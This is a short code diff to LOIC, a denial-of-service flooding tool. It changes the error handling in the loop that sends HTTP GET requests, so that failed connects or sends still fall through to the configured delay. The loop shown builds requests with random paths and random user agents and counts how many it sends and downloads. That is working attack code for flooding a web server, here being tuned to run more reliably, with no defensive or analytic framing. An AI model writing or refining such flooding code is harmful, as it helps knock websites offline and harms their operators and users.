@@ -87,7 +87,7 @@ namespace LOIC
 						State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
 						try { socket.Connect(RHost); }
-						catch(SocketException) { continue; }
+						catch(SocketException) { goto _continue; }
 
 						byte[] buf = Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? Functions.RandomString() : ""), Functions.RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : ""), Environment.NewLine));
 
@@ -95,7 +95,7 @@ namespace LOIC
 						State = ReqState.Requesting; // SET STATE TO REQUESTING //
 
 						try { socket.Send(buf, SocketFlags.None); }
-						catch(SocketException) { continue; }
+						catch(SocketException) { goto _continue; }
 
 						State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
 
@@ -105,7 +105,7 @@ namespace LOIC
 					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
 					tTimepoll.Stop();
 					tTimepoll.Start();
-
+_continue:
 					if(Delay >= 0)
 						System.Threading.Thread.Sleep(Delay+1);
 				}
